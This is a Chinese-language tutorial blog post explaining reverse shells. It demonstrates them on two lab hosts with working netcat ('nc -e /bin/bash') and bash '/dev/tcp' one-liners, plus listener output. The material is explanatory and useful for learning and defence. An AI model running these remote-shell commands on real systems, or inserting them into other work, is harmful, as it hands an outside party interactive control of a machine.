---
title: 反弹 Shell
icon: reverse
date: 2023-4-12
category: Computer
tag:
    - Linux
---

## 什么是 Shell

Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。

## 什么是反弹 Shell

其英文名叫做 `Reverse Shell`，就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。

比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B 了。

## 反弹 Shell 的作用

当我们使用 A 控制 B，但由于被控端因防火墙受限、权限不足、端口被占用等无法直接连接。这时我们就要使用反弹 Shell 让 B 向 A 主动发起连接，我们就可以使用 A 来控制 B 了。

## 使用方法

|  控制端  |  被控制端  |
|  :----:  |  :----:  |
|  IP：192.168.4.151  |  IP：192.168.4.142  |
|  hostname：root@localhost  |  hostname：root@dev_03  |

1. 控制端和被控制端都安装 nc 命令

    ```bash
    yum -y install nc
    ```

2. 监听端口。在控制端上执行 `nc -lvvp 9999` 命令

    ```bash
    [root@localhost ~]# nc -lvvp 9999
    Ncat: Version 7.70 ( https://nmap.org/ncat )  # 输出结果
    Ncat: Listening on :::9999
    Ncat: Listening on 0.0.0.0:9999
    ```

    - **-l**：监听模式，用于入站连接
    - **-vv**：`-vv` 比 `-v` 更详细的输出
    - **-p**：设置本地端口

3. 发起连接请求。在被控制端上执行 `nc -e /bin/bash [控制端的 IP] 9999` 命令

    ```bash
    root@dev_03:~# nc -e /bin/bash 192.168.4.151 9999
    ```

    - **-e**：绑定命令行

    ::: tip
    如果没有 `-e` 这个参数，是因为 `nc` 老版本没有这个选项的。需要安装 `netcat-traditional` 这个包，并执行 `update-alternatives --config nc` 这个命令，选择 `/bin/nc.traditional` 的编号，这里选择编号 `2` 即可
    :::

4. 控制端接收连接请求。被控制端发起连接请求后，查看控制端

    ```bash
    [root@localhost ~]# nc -lvvp 9999
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::9999
    Ncat: Listening on 0.0.0.0:9999
    Ncat: Connection from 192.168.4.142.
    Ncat: Connection from 192.168.4.142:39064.
    ```

5. 测试。控制端进行测试

    ```bash
    [root@localhost ~]# nc -lvvp 9999
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::9999
    Ncat: Listening on 0.0.0.0:9999
    Ncat: Connection from 192.168.4.142.
    Ncat: Connection from 192.168.4.142:39064.

    uname -a
    Linux dev_03 4.15.0-193-generic #204-Ubuntu SMP Fri Aug 26 19:20:21 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

    ifconfig ens33
    ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 192.168.4.142  netmask 255.255.255.0  broadcast 192.168.4.255
            inet6 fe80::20c:29ff:fe14:1e21  prefixlen 64  scopeid 0x20<link>
    ```

## 被控制端使用 bash 发起连接

被控制端也可以不用安装 nc 这个命令发起连接，可以直接使用 bash 来实现。

1. 监听端口。在控制端上执行 `nc -lvvp 9999` 命令

    ```bash
    [root@localhost ~]# nc -lvvp 9999
    Ncat: Version 7.70 ( https://nmap.org/ncat )  # 输出结果
    Ncat: Listening on :::9999
    Ncat: Listening on 0.0.0.0:9999
    ```

2. 发起连接请求。在被控制端上执行 `bash -i >& /dev/tcp/[控制端的 IP]/9999 0>&1` 命令

    ```bash
    root@dev_03:~# bash -i >& /dev/tcp/192.168.4.151/9999 0>&1
    ```

    - **bash -i**：就是产生一个 bash 交互环境
    - **>&**：可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方
    - **/dev/tcp/[控制端的 IP]/9999**：指的是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接
    - **0>&1**：可以将标准输入和标准输出相结合，重定向给前面标准输出的内容

    通过这样的命令，我们就可以就是将被控制端的标准输出和错误输出都重定向给控制端，并且将控制端的输入都重定向给被控制端，这样我们就可以实现控制端对被控制端的远程控制了。

3. 控制端接收连接请求。被控制端发起连接请求后，查看控制端，会显示被控制端的 localhost

    ```bash
    [root@localhost ~]# nc -lvvp 9999
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::9999
    Ncat: Listening on 0.0.0.0:9999
    Ncat: Connection from 192.168.4.142.
    Ncat: Connection from 192.168.4.142:34944.
    root@dev_03:~#
    ```

4. 测试。控制端进行测试

    ```bash
    [root@localhost ~]# nc -lvvp 9999
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::9999
    Ncat: Listening on 0.0.0.0:9999
    Ncat: Connection from 192.168.4.142.
    Ncat: Connection from 192.168.4.142:34944.
    root@dev_03:~#

    root@dev_03:~# uname -a
    uname -a
    Linux dev_03 4.15.0-193-generic #204-Ubuntu SMP Fri Aug 26 19:20:21 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
    root@dev_03:~#

    root@dev_03:~# ifconfig ens33
    ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 192.168.4.142  netmask 255.255.255.0  broadcast 192.168.4.255
            inet6 fe80::20c:29ff:fe14:1e21  prefixlen 64  scopeid 0x20<link>
    root@dev_03:~#
    ```
